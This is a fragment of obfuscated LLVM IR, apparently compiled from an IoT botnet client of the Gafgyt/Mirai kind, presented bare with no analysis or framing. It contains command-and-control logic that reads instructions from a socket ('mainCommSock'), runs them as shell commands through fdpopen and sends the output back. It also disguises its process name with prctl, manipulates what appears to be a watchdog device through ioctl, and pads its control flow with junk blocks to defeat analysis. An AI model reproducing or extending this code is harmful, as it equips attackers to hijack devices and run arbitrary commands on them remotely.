  %642 = or i1 %640, %641
  br i1 %642, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %634
  %643 = load i32*, i32** @pids, align 8
  %644 = bitcast i32* %643 to i8*
  call void @free(i8* %644) #2
  %645 = load i32*, i32** %30, align 8
  store i32* %645, i32** @pids, align 8
  %646 = load i32, i32* @x.83
  %647 = load i32, i32* @y.84
  %648 = sub i32 %646, 1
  %649 = mul i32 %646, %648
  %650 = urem i32 %649, 2
  %651 = icmp eq i32 %650, 0
  %652 = icmp slt i32 %647, 10
  %653 = or i1 %651, %652
  br i1 %653, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %654

; <label>:654:                                    ; preds = %originalBBpart2126, %originalBBpart2106
  br label %655

; <label>:655:                                    ; preds = %654
  %656 = load i32, i32* @x.83
  %657 = load i32, i32* @y.84
  %658 = sub i32 %656, 1
  %659 = mul i32 %656, %658
  %660 = urem i32 %659, 2
  %661 = icmp eq i32 %660, 0
  %662 = icmp slt i32 %657, 10
  %663 = or i1 %661, %662
  br i1 %663, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %655
  %664 = load i32, i32* %29, align 4
  %665 = add nsw i32 %664, 1
  store i32 %665, i32* %29, align 4
  %666 = load i32, i32* @x.83
  %667 = load i32, i32* @y.84
  %668 = sub i32 %666, 1
  %669 = mul i32 %666, %668
  %670 = urem i32 %669, 2
  %671 = icmp eq i32 %670, 0
  %672 = icmp slt i32 %667, 10
  %673 = or i1 %671, %672
  br i1 %673, label %originalBBpart2136, label %originalBB128alteredBB

originalBBpart2136:                               ; preds = %originalBB128
  br label %488

; <label>:674:                                    ; preds = %488
  %675 = load i32, i32* %28, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i64 0, i64 %676
  store i8 0, i8* %677, align 1
  %678 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  call void @trim(i8* %678)
  %679 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  %680 = call i8* @strstr(i8* %679, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #10
  %681 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  %682 = icmp eq i8* %680, %681
  br i1 %682, label %683, label %686

; <label>:683:                                    ; preds = %674
  %684 = load i32, i32* @mainCommSock, align 4
  %685 = call i32 (i32, i8*, ...) @sockprintf(i32 %684, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.142, i32 0, i32 0))
  br label %482

; <label>:686:                                    ; preds = %674
  %687 = load i32, i32* @x.83
  %688 = load i32, i32* @y.84
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %686
  %695 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  store i8* %695, i8** %32, align 8
  %696 = load i8*, i8** %32, align 8
  %697 = load i8, i8* %696, align 1
  %698 = zext i8 %697 to i32
  %699 = icmp eq i32 %698, 33
  %700 = load i32, i32* @x.83
  %701 = load i32, i32* @y.84
  %702 = sub i32 %700, 1
  %703 = mul i32 %700, %702
  %704 = urem i32 %703, 2
  %705 = icmp eq i32 %704, 0
  %706 = icmp slt i32 %701, 10
  %707 = or i1 %705, %706
  br i1 %707, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %699, label %708, label %1034

; <label>:708:                                    ; preds = %originalBBpart2140
  %709 = load i8*, i8** %32, align 8
  %710 = getelementptr inbounds i8, i8* %709, i64 1
  store i8* %710, i8** %33, align 8
  br label %711

; <label>:711:                                    ; preds = %originalBBpart2148, %708
  %712 = load i8*, i8** %33, align 8
  %713 = load i8, i8* %712, align 1
  %714 = zext i8 %713 to i32
  %715 = icmp ne i32 %714, 32
  br i1 %715, label %716, label %737

; <label>:716:                                    ; preds = %711
  %717 = load i32, i32* @x.83
  %718 = load i32, i32* @y.84
  %719 = sub i32 %717, 1
  %720 = mul i32 %717, %719
  %721 = urem i32 %720, 2
  %722 = icmp eq i32 %721, 0
  %723 = icmp slt i32 %718, 10
  %724 = or i1 %722, %723
  br i1 %724, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %716
  %725 = load i8*, i8** %33, align 8
  %726 = load i8, i8* %725, align 1
  %727 = zext i8 %726 to i32
  %728 = icmp ne i32 %727, 0
  %729 = load i32, i32* @x.83
  %730 = load i32, i32* @y.84
  %731 = sub i32 %729, 1
  %732 = mul i32 %729, %731
  %733 = urem i32 %732, 2
  %734 = icmp eq i32 %733, 0
  %735 = icmp slt i32 %730, 10
  %736 = or i1 %734, %735
  br i1 %736, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %737

; <label>:737:                                    ; preds = %originalBBpart2144, %711
  %738 = phi i1 [ false, %711 ], [ %728, %originalBBpart2144 ]
  br i1 %738, label %739, label %758

; <label>:739:                                    ; preds = %737
  %740 = load i32, i32* @x.83
  %741 = load i32, i32* @y.84
  %742 = sub i32 %740, 1
  %743 = mul i32 %740, %742
  %744 = urem i32 %743, 2
  %745 = icmp eq i32 %744, 0
  %746 = icmp slt i32 %741, 10
  %747 = or i1 %745, %746
  br i1 %747, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %739
  %748 = load i8*, i8** %33, align 8
  %749 = getelementptr inbounds i8, i8* %748, i32 1
  store i8* %749, i8** %33, align 8
  %750 = load i32, i32* @x.83
  %751 = load i32, i32* @y.84
  %752 = sub i32 %750, 1
  %753 = mul i32 %750, %752
  %754 = urem i32 %753, 2
  %755 = icmp eq i32 %754, 0
  %756 = icmp slt i32 %751, 10
  %757 = or i1 %755, %756
  br i1 %757, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br label %711

; <label>:758:                                    ; preds = %737
  %759 = load i32, i32* @x.83
  %760 = load i32, i32* @y.84
  %761 = sub i32 %759, 1
  %762 = mul i32 %759, %761
  %763 = urem i32 %762, 2
  %764 = icmp eq i32 %763, 0
  %765 = icmp slt i32 %760, 10
  %766 = or i1 %764, %765
  br i1 %766, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %758
  %767 = load i8*, i8** %33, align 8
  %768 = load i8, i8* %767, align 1
  %769 = zext i8 %768 to i32
  %770 = icmp eq i32 %769, 0
  %771 = load i32, i32* @x.83
  %772 = load i32, i32* @y.84
  %773 = sub i32 %771, 1
  %774 = mul i32 %771, %773
  %775 = urem i32 %774, 2
  %776 = icmp eq i32 %775, 0
  %777 = icmp slt i32 %772, 10
  %778 = or i1 %776, %777
  br i1 %778, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %770, label %779, label %780

; <label>:779:                                    ; preds = %originalBBpart2152
  br label %482

; <label>:780:                                    ; preds = %originalBBpart2152
  %781 = load i8*, i8** %33, align 8
  store i8 0, i8* %781, align 1
  %782 = load i8*, i8** %32, align 8
  %783 = getelementptr inbounds i8, i8* %782, i64 1
  store i8* %783, i8** %33, align 8
  %784 = load i8*, i8** %32, align 8
  %785 = load i8*, i8** %33, align 8
  %786 = call i64 @strlen(i8* %785) #10
  %787 = getelementptr inbounds i8, i8* %784, i64 %786
  %788 = getelementptr inbounds i8, i8* %787, i64 2
  store i8* %788, i8** %32, align 8
  br label %789

; <label>:789:                                    ; preds = %809, %780
  %790 = load i8*, i8** %32, align 8
  %791 = load i8*, i8** %32, align 8
  %792 = call i64 @strlen(i8* %791) #10
  %793 = sub i64 %792, 1
  %794 = getelementptr inbounds i8, i8* %790, i64 %793
  %795 = load i8, i8* %794, align 1
  %796 = zext i8 %795 to i32
  %797 = icmp eq i32 %796, 10
  br i1 %797, label %807, label %798

; <label>:798:                                    ; preds = %789
  %799 = load i8*, i8** %32, align 8
  %800 = load i8*, i8** %32, align 8
  %801 = call i64 @strlen(i8* %800) #10
  %802 = sub i64 %801, 1
  %803 = getelementptr inbounds i8, i8* %799, i64 %802
  %804 = load i8, i8* %803, align 1
  %805 = zext i8 %804 to i32
  %806 = icmp eq i32 %805, 13
  br label %807

; <label>:807:                                    ; preds = %798, %789
  %808 = phi i1 [ true, %789 ], [ %806, %798 ]
  br i1 %808, label %809, label %815

; <label>:809:                                    ; preds = %807
  %810 = load i8*, i8** %32, align 8
  %811 = load i8*, i8** %32, align 8
  %812 = call i64 @strlen(i8* %811) #10
  %813 = sub i64 %812, 1
  %814 = getelementptr inbounds i8, i8* %810, i64 %813
  store i8 0, i8* %814, align 1
  br label %789

; <label>:815:                                    ; preds = %807
  %816 = load i32, i32* @x.83
  %817 = load i32, i32* @y.84
  %818 = sub i32 %816, 1
  %819 = mul i32 %816, %818
  %820 = urem i32 %819, 2
  %821 = icmp eq i32 %820, 0
  %822 = icmp slt i32 %817, 10
  %823 = or i1 %821, %822
  br i1 %823, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %815
  %824 = load i8*, i8** %32, align 8
  store i8* %824, i8** %34, align 8
  %825 = load i32, i32* @x.83
  %826 = load i32, i32* @y.84
  %827 = sub i32 %825, 1
  %828 = mul i32 %825, %827
  %829 = urem i32 %828, 2
  %830 = icmp eq i32 %829, 0
  %831 = icmp slt i32 %826, 10
  %832 = or i1 %830, %831
  br i1 %832, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %833

; <label>:833:                                    ; preds = %845, %originalBBpart2156
  %834 = load i8*, i8** %32, align 8
  %835 = load i8, i8* %834, align 1
  %836 = zext i8 %835 to i32
  %837 = icmp ne i32 %836, 32
  br i1 %837, label %838, label %843

; <label>:838:                                    ; preds = %833
  %839 = load i8*, i8** %32, align 8
  %840 = load i8, i8* %839, align 1
  %841 = zext i8 %840 to i32
  %842 = icmp ne i32 %841, 0
  br label %843

; <label>:843:                                    ; preds = %838, %833
  %844 = phi i1 [ false, %833 ], [ %842, %838 ]
  br i1 %844, label %845, label %848

; <label>:845:                                    ; preds = %843
  %846 = load i8*, i8** %32, align 8
  %847 = getelementptr inbounds i8, i8* %846, i32 1
  store i8* %847, i8** %32, align 8
  br label %833

; <label>:848:                                    ; preds = %843
  %849 = load i8*, i8** %32, align 8
  store i8 0, i8* %849, align 1
  %850 = load i8*, i8** %32, align 8
  %851 = getelementptr inbounds i8, i8* %850, i32 1
  store i8* %851, i8** %32, align 8
  %852 = load i8*, i8** %34, align 8
  store i8* %852, i8** %35, align 8
  br label %853

; <label>:853:                                    ; preds = %857, %848
  %854 = load i8*, i8** %35, align 8
  %855 = load i8, i8* %854, align 1
  %856 = icmp ne i8 %855, 0
  br i1 %856, label %857, label %866

; <label>:857:                                    ; preds = %853
  %858 = load i8*, i8** %35, align 8
  %859 = load i8, i8* %858, align 1
  %860 = zext i8 %859 to i32
  %861 = call i32 @toupper(i32 %860) #10
  %862 = trunc i32 %861 to i8
  %863 = load i8*, i8** %35, align 8
  store i8 %862, i8* %863, align 1
  %864 = load i8*, i8** %35, align 8
  %865 = getelementptr inbounds i8, i8* %864, i32 1
  store i8* %865, i8** %35, align 8
  br label %853

; <label>:866:                                    ; preds = %853
  %867 = load i8*, i8** %34, align 8
  %868 = call i32 @strcmp(i8* %867, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.143, i32 0, i32 0)) #10
  %869 = icmp eq i32 %868, 0
  br i1 %869, label %870, label %928

; <label>:870:                                    ; preds = %866
  %871 = load i32, i32* @x.83
  %872 = load i32, i32* @y.84
  %873 = sub i32 %871, 1
  %874 = mul i32 %871, %873
  %875 = urem i32 %874, 2
  %876 = icmp eq i32 %875, 0
  %877 = icmp slt i32 %872, 10
  %878 = or i1 %876, %877
  br i1 %878, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %870
  %879 = call i32 @listFork()
  %880 = icmp ne i32 %879, 0
  %881 = load i32, i32* @x.83
  %882 = load i32, i32* @y.84
  %883 = sub i32 %881, 1
  %884 = mul i32 %881, %883
  %885 = urem i32 %884, 2
  %886 = icmp eq i32 %885, 0
  %887 = icmp slt i32 %882, 10
  %888 = or i1 %886, %887
  br i1 %888, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br i1 %880, label %889, label %890

; <label>:889:                                    ; preds = %originalBBpart2160
  br label %482

; <label>:890:                                    ; preds = %originalBBpart2160
  %891 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %891, i8 0, i64 1024, i32 16, i1 false)
  %892 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  %893 = load i8*, i8** %32, align 8
  %894 = call i32 (i8*, i8*, ...) @szprintf(i8* %892, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.144, i32 0, i32 0), i8* %893)
  %895 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  %896 = call i32 @fdpopen(i8* %895, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store i32 %896, i32* %37, align 4
  br label %897

; <label>:897:                                    ; preds = %902, %890
  %898 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  %899 = load i32, i32* %37, align 4
  %900 = call i8* @fdgets(i8* %898, i32 1024, i32 %899)
  %901 = icmp ne i8* %900, null
  br i1 %901, label %902, label %909

; <label>:902:                                    ; preds = %897
  %903 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  call void @trim(i8* %903)
  %904 = load i32, i32* @mainCommSock, align 4
  %905 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  %906 = call i32 (i32, i8*, ...) @sockprintf(i32 %904, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.145, i32 0, i32 0), i8* %905)
  %907 = getelementptr inbounds [1024 x i8], [1024 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %907, i8 0, i64 1024, i32 16, i1 false)
  %908 = call i32 @sleep(i32 1)
  br label %897

; <label>:909:                                    ; preds = %897
  %910 = load i32, i32* @x.83
  %911 = load i32, i32* @y.84
  %912 = sub i32 %910, 1
  %913 = mul i32 %910, %912
  %914 = urem i32 %913, 2
  %915 = icmp eq i32 %914, 0
  %916 = icmp slt i32 %911, 10
  %917 = or i1 %915, %916
  br i1 %917, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %909
  %918 = load i32, i32* %37, align 4
  %919 = call i32 @fdpclose(i32 %918)
  call void @exit(i32 0) #14
  %920 = load i32, i32* @x.83
  %921 = load i32, i32* @y.84
  %922 = sub i32 %920, 1
  %923 = mul i32 %920, %922
  %924 = urem i32 %923, 2
  %925 = icmp eq i32 %924, 0
  %926 = icmp slt i32 %921, 10
  %927 = or i1 %925, %926
  br i1 %927, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  unreachable

; <label>:928:                                    ; preds = %866
  store i32 1, i32* %39, align 4
  %929 = load i8*, i8** %32, align 8
  %930 = call i8* @strtok(i8* %929, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0)) #2
  store i8* %930, i8** %40, align 8
  %931 = load i8*, i8** %34, align 8
  %932 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 0
  store i8* %931, i8** %932, align 16
  br label %933

; <label>:933:                                    ; preds = %980, %928
  %934 = load i8*, i8** %40, align 8
  %935 = icmp ne i8* %934, null
  br i1 %935, label %936, label %982

; <label>:936:                                    ; preds = %933
  %937 = load i8*, i8** %40, align 8
  %938 = load i8, i8* %937, align 1
  %939 = zext i8 %938 to i32
  %940 = icmp ne i32 %939, 10
  br i1 %940, label %941, label %980

; <label>:941:                                    ; preds = %936
  %942 = load i32, i32* @x.83
  %943 = load i32, i32* @y.84
  %944 = sub i32 %942, 1
  %945 = mul i32 %942, %944
  %946 = urem i32 %945, 2
  %947 = icmp eq i32 %946, 0
  %948 = icmp slt i32 %943, 10
  %949 = or i1 %947, %948
  br i1 %949, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %941
  %950 = load i8*, i8** %40, align 8
  %951 = call i64 @strlen(i8* %950) #10
  %952 = add i64 %951, 1
  %953 = call noalias i8* @malloc(i64 %952) #2
  %954 = load i32, i32* %39, align 4
  %955 = sext i32 %954 to i64
  %956 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %955
  store i8* %953, i8** %956, align 8
  %957 = load i32, i32* %39, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %958
  %960 = load i8*, i8** %959, align 8
  %961 = load i8*, i8** %40, align 8
  %962 = call i64 @strlen(i8* %961) #10
  %963 = add i64 %962, 1
  call void @llvm.memset.p0i8.i64(i8* %960, i8 0, i64 %963, i32 1, i1 false)
  %964 = load i32, i32* %39, align 4
  %965 = sext i32 %964 to i64
  %966 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %965
  %967 = load i8*, i8** %966, align 8
  %968 = load i8*, i8** %40, align 8
  %969 = call i8* @strcpy(i8* %967, i8* %968) #2
  %970 = load i32, i32* %39, align 4
  %971 = add nsw i32 %970, 1
  store i32 %971, i32* %39, align 4
  %972 = load i32, i32* @x.83
  %973 = load i32, i32* @y.84
  %974 = sub i32 %972, 1
  %975 = mul i32 %972, %974
  %976 = urem i32 %975, 2
  %977 = icmp eq i32 %976, 0
  %978 = icmp slt i32 %973, 10
  %979 = or i1 %977, %978
  br i1 %979, label %originalBBpart2191, label %originalBB166alteredBB

originalBBpart2191:                               ; preds = %originalBB166
  br label %980

; <label>:980:                                    ; preds = %originalBBpart2191, %936
  %981 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0)) #2
  store i8* %981, i8** %40, align 8
  br label %933

; <label>:982:                                    ; preds = %933
  %983 = load i32, i32* @x.83
  %984 = load i32, i32* @y.84
  %985 = sub i32 %983, 1
  %986 = mul i32 %983, %985
  %987 = urem i32 %986, 2
  %988 = icmp eq i32 %987, 0
  %989 = icmp slt i32 %984, 10
  %990 = or i1 %988, %989
  br i1 %990, label %originalBB193, label %originalBB193alteredBB

originalBB193:                                    ; preds = %originalBB193alteredBB, %982
  %991 = load i32, i32* %39, align 4
  %992 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i32 0, i32 0
  call void @processCmd(i32 %991, i8** %992)
  %993 = load i32, i32* %39, align 4
  %994 = icmp sgt i32 %993, 1
  %995 = load i32, i32* @x.83
  %996 = load i32, i32* @y.84
  %997 = sub i32 %995, 1
  %998 = mul i32 %995, %997
  %999 = urem i32 %998, 2
  %1000 = icmp eq i32 %999, 0
  %1001 = icmp slt i32 %996, 10
  %1002 = or i1 %1000, %1001
  br i1 %1002, label %originalBBpart2195, label %originalBB193alteredBB

originalBBpart2195:                               ; preds = %originalBB193
  br i1 %994, label %1003, label %1033

; <label>:1003:                                   ; preds = %originalBBpart2195
  store i32 1, i32* %41, align 4
  store i32 1, i32* %41, align 4
  br label %1004

; <label>:1004:                                   ; preds = %1029, %1003
  %1005 = load i32, i32* %41, align 4
  %1006 = load i32, i32* %39, align 4
  %1007 = icmp slt i32 %1005, %1006
  br i1 %1007, label %1008, label %1032

; <label>:1008:                                   ; preds = %1004
  %1009 = load i32, i32* @x.83
  %1010 = load i32, i32* @y.84
  %1011 = sub i32 %1009, 1
  %1012 = mul i32 %1009, %1011
  %1013 = urem i32 %1012, 2
  %1014 = icmp eq i32 %1013, 0
  %1015 = icmp slt i32 %1010, 10
  %1016 = or i1 %1014, %1015
  br i1 %1016, label %originalBB197, label %originalBB197alteredBB

originalBB197:                                    ; preds = %originalBB197alteredBB, %1008
  %1017 = load i32, i32* %41, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %1018
  %1020 = load i8*, i8** %1019, align 8
  call void @free(i8* %1020) #2
  %1021 = load i32, i32* @x.83
  %1022 = load i32, i32* @y.84
  %1023 = sub i32 %1021, 1
  %1024 = mul i32 %1021, %1023
  %1025 = urem i32 %1024, 2
  %1026 = icmp eq i32 %1025, 0
  %1027 = icmp slt i32 %1022, 10
  %1028 = or i1 %1026, %1027
  br i1 %1028, label %originalBBpart2199, label %originalBB197alteredBB

originalBBpart2199:                               ; preds = %originalBB197
  br label %1029

; <label>:1029:                                   ; preds = %originalBBpart2199
  %1030 = load i32, i32* %41, align 4
  %1031 = add nsw i32 %1030, 1
  store i32 %1031, i32* %41, align 4
  br label %1004

; <label>:1032:                                   ; preds = %1004
  br label %1033

; <label>:1033:                                   ; preds = %1032, %originalBBpart2195
  br label %1034

; <label>:1034:                                   ; preds = %1033, %originalBBpart2140
  %1035 = load i32, i32* @x.83
  %1036 = load i32, i32* @y.84
  %1037 = sub i32 %1035, 1
  %1038 = mul i32 %1035, %1037
  %1039 = urem i32 %1038, 2
  %1040 = icmp eq i32 %1039, 0
  %1041 = icmp slt i32 %1036, 10
  %1042 = or i1 %1040, %1041
  br i1 %1042, label %originalBB201, label %originalBB201alteredBB

originalBB201:                                    ; preds = %originalBB201alteredBB, %1034
  %1043 = load i32, i32* @x.83
  %1044 = load i32, i32* @y.84
  %1045 = sub i32 %1043, 1
  %1046 = mul i32 %1043, %1045
  %1047 = urem i32 %1046, 2
  %1048 = icmp eq i32 %1047, 0
  %1049 = icmp slt i32 %1044, 10
  %1050 = or i1 %1048, %1049
  br i1 %1050, label %originalBBpart2203, label %originalBB201alteredBB

originalBBpart2203:                               ; preds = %originalBB201
  br label %482

; <label>:1051:                                   ; preds = %482
  br label %456

originalBBalteredBB:                              ; preds = %originalBB, %2
  %1052 = alloca i32, align 4
  %1053 = alloca i32, align 4
  %1054 = alloca i8**, align 8
  %1055 = alloca i8*, align 8
  %1056 = alloca i32, align 4
  %1057 = alloca i32, align 4
  %1058 = alloca i32, align 4
  %1059 = alloca i32, align 4
  %1060 = alloca [256 x i8], align 16
  %1061 = alloca i8*, align 8
  %1062 = alloca %struct._IO_FILE*, align 8
  %1063 = alloca [256 x i8], align 16
  %1064 = alloca [1024 x i8], align 16
  %1065 = alloca i32, align 4
  %1066 = alloca i32, align 4
  %1067 = alloca %struct._IO_FILE*, align 8
  %1068 = alloca [4096 x i8], align 16
  %1069 = alloca i32, align 4
  %1070 = alloca i32, align 4
  %1071 = alloca i32*, align 8
  %1072 = alloca i32, align 4
  %1073 = alloca i8*, align 8
  %1074 = alloca i8*, align 8
  %1075 = alloca i8*, align 8
  %1076 = alloca i8*, align 8
  %1077 = alloca [1024 x i8], align 16
  %1078 = alloca i32, align 4
  %1079 = alloca [10 x i8*], align 16
  %1080 = alloca i32, align 4
  %1081 = alloca i8*, align 8
  %1082 = alloca i32, align 4
  store i32 0, i32* %1052, align 4
  store i32 %0, i32* %1053, align 4
  store i8** %1, i8*** %1054, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i8** %1055, align 8
  %1083 = load i8**, i8*** %1054, align 8
  %1084 = getelementptr inbounds i8*, i8** %1083, i64 0
  %1085 = load i8*, i8** %1084, align 8
  %1086 = load i8**, i8*** %1054, align 8
  %1087 = getelementptr inbounds i8*, i8** %1086, i64 0
  %1088 = load i8*, i8** %1087, align 8
  %1089 = call i64 @strlen(i8* %1088) #10
  %1090 = call i8* @strncpy(i8* %1085, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i64 %1089) #2
  %1091 = load i8**, i8*** %1054, align 8
  %1092 = getelementptr inbounds i8*, i8** %1091, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i8** %1092, align 8
  %1093 = load i8*, i8** %1055, align 8
  %1094 = ptrtoint i8* %1093 to i64
  %1095 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %1094, i32 0, i32 0, i32 0)
  %1096 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1097 = call i32 @getpid() #2
  %_ = sub i32 0, %1096
  %gen = add i32 %_, %1097
  %_1 = shl i32 %1096, %1097
  %_2 = sub i32 %1096, %1097
  %gen3 = mul i32 %_2, %1097
  %_4 = shl i32 %1096, %1097
  %1098 = xor i32 %1096, %1097
  call void @srand(i32 %1098) #2
  %1099 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1100 = call i32 @getpid() #2
  %_5 = sub i32 0, %1099
  %gen6 = add i32 %_5, %1100
  %_7 = sub i32 0, %1099
  %gen8 = add i32 %_7, %1100
  %_9 = sub i32 0, %1099
  %gen10 = add i32 %_9, %1100
  %_11 = sub i32 0, %1099
  %gen12 = add i32 %_11, %1100
  %_13 = sub i32 %1099, %1100
  %gen14 = mul i32 %_13, %1100
  %_15 = sub i32 0, %1099
  %gen16 = add i32 %_15, %1100
  %_17 = sub i32 0, %1099
  %gen18 = add i32 %_17, %1100
  %1101 = xor i32 %1099, %1100
  call void @init_rand(i32 %1101)
  store i32 0, i32* %1056, align 4
  %1102 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.131, i32 0, i32 0))
  %1103 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.132, i32 0, i32 0))
  store i32 0, i32* %1057, align 4
  %1104 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.133, i32 0, i32 0), i32 2)
  store i32 %1104, i32* %1057, align 4
  %1105 = icmp ne i32 %1104, -1
  br label %originalBB

originalBB19alteredBB:                            ; preds = %originalBB19, %76
  store i32 1, i32* %17, align 4
  %1106 = load i32, i32* %16, align 4
  %1107 = call i32 (i32, i64, ...) @ioctl(i32 %1106, i64 2147768068, i32* %17) #2
  %1108 = call i32 @fork() #2
  store i32 %1108, i32* %18, align 4
  %1109 = icmp eq i32 %1108, 0
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %98
  %1110 = load i32, i32* %16, align 4
  %1111 = call i32 (i32, i64, ...) @ioctl(i32 %1110, i64 2147768069, i32 0) #2
  %1112 = call i32 @sleep(i32 10)
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %118
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %135
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.135, i32 0, i32 0), i8** %20, align 8
  %1113 = load i8*, i8** %20, align 8
  %1114 = call %struct._IO_FILE* @fopen(i8* %1113, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store %struct._IO_FILE* %1114, %struct._IO_FILE** %21, align 8
  %1115 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %1116 = icmp eq %struct._IO_FILE* %1115, null
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %174
  %1117 = load i8**, i8*** %13, align 8
  %1118 = getelementptr inbounds i8*, i8** %1117, i64 0
  %1119 = load i8*, i8** %1118, align 8
  %1120 = load i32, i32* %24, align 4
  %1121 = sext i32 %1120 to i64
  %1122 = getelementptr inbounds i8, i8* %1119, i64 %1121
  %1123 = load i8, i8* %1122, align 1
  %1124 = sext i8 %1123 to i32
  %1125 = icmp ne i32 %1124, 47
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %200
  %1126 = load i32, i32* %24, align 4
  %1127 = add nsw i32 %1126, -1
  store i32 %1127, i32* %24, align 4
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %219
  %1128 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i32 0, i32 0
  %1129 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i32 0, i32 0
  %1130 = load i8**, i8*** %13, align 8
  %1131 = getelementptr inbounds i8*, i8** %1130, i64 0
  %1132 = load i8*, i8** %1131, align 8
  %1133 = load i32, i32* %24, align 4
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds i8, i8* %1132, i64 %1134
  %1136 = call i32 (i8*, i8*, ...) @sprintf(i8* %1128, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i32 0, i32 0), i8* %1129, i8* %1135) #2
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %245
  %1137 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %1138 = call i32 @feof(%struct._IO_FILE* %1137) #2
  %1139 = icmp ne i32 %1138, 0
  %_48 = shl i1 %1139, true
  %_49 = sub i1 %1139, true
  %gen50 = mul i1 %_49, true
  %_51 = shl i1 %1139, true
  %_52 = sub i1 false, %1139
  %gen53 = add i1 %_52, true
  %1140 = xor i1 %1139, true
  br label %originalBB47

